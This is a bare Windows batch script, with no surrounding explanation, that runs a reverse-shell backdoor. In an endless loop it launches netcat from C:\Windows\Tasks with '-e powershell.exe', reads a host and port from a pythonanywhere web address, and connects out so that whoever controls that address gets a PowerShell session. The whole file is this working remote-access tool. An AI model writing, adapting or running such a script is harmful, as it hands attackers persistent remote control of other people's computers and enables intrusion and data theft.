@echo off
:x
powershell -c "C:\\Windows\\Tasks\\nc.exe -e powershell.exe ([System.Net.Dns]::GetHostAddresses((Invoke-WebRequest -Uri http://404errornotfound.pythonanywhere.com).content.Split(':')[0]).IPAddressToString[1]) ((Invoke-WebRequest -Uri http://404errornotfound.pythonanywhere.com).content.Split(':')[1])"
goto x
